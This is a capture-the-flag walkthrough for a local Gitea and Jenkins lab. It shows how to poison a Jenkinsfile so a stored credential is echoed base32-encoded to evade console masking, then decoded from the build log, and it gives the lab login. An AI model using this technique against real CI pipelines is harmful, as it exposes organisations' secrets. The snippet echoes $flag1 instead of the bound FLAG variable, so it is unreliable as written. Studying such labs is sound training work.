After accessing the Gitea hosted locally on port 3000 with the credentials  
```
username : thealice
password : thealice
```
We need to follow these steps :

`1`  Clone the white rabbit repository 
```
git clone repo_link
```
`2` Create a new branch to modify the JenkinsFile 
> The JenkinsFile conatins the pipeline's jobs auotamatically executed by the jenkins server, so within this file, we will perform our PPE (pipeline poisoning execution) to retrieve the requested flag from the credentials store.
```
git checkout -b 'white-rabbit-challenge1'
```
Now, open the JenkinsFile with your favorite TextEditor and let's dive into the fun stuff. Modify the stage and its steps to look like :
```
stage ('displaying flag'){
	steps{
	withCredentials([string(credentialsID: 'flag1', variable: 'FLAG')]) {
	sh
	'''
		echo $flag1 | base32
	'''
	}
	}
}
```
> We used base32 encoding because when asked to standard output secrets or credentials, jenkins' output console will automatically display *** instead of the actual content of the secret in order not to accidentally expose sensitive informations so we encoded it to be able to retrieve it later

`4` Commit and Push the changes to the original repository

`5` Log in to Jenkins hosted locally on port 8080, and check the build history section corresponding to the white rabbit repository, you will find the build results on the output console.

`6` Base32 decode your flag and submit it.


